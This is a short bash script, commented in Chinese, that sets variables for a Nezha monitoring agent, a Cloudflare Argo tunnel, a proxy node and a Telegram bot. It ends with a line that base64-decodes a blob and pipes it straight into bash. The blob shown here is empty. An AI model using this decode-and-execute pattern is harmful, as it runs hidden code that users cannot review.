#!/bin/bash
export UUID=${UUID:-''} # 哪吒v1,在不同的平台部署需要改UUID，否则会覆盖
export NEZHA_SERVER=${NEZHA_SERVER:-''} #v1哪吒填写形式：nezha.abc.com:8008,v0哪吒填写形式：nezha.abc.com
export NEZHA_PORT=${NEZHA_PORT:-'443'}           # v1哪吒留空此项,v0哪吒agent端口为{443,8443,2053,2083,2087,2096}其中之一时自动开启tls
export NEZHA_KEY=${NEZHA_KEY:-''}             # v1的NZ_CLIENT_SECRET或v0的agent密钥
export ARGO_DOMAIN=${ARGO_DOMAIN:-''}         # 固定隧道域名,留空即启用临时隧道
export ARGO_AUTH=${ARGO_AUTH:-''}             # 固定隧道token或json,留空即启用临时隧道
export CFIP=${CFIP:-'www.visa.com.tw'}        
export CFPORT=${CFPORT:-'443'}                 
export NAME=${NAME:-''}                
export FILE_PATH=${FILE_PATH:-'./tmp'}          
export ARGO_PORT=${ARGO_PORT:-''}        # argo端口请随便改一个别人没用过的，使用token需要在cloudflared设置和这里一致
export CHAT_ID=${CHAT_ID:-''}                 
export BOT_TOKEN=${BOT_TOKEN:-''}             
export UPLOAD_URL=${UPLOAD_URL:-''}  # 节点自动上传地址,没有可不填,需要填部署Merge-sub项目后的首页地址,例如：https://merge.serv00.net

echo "" | base64 -d | bash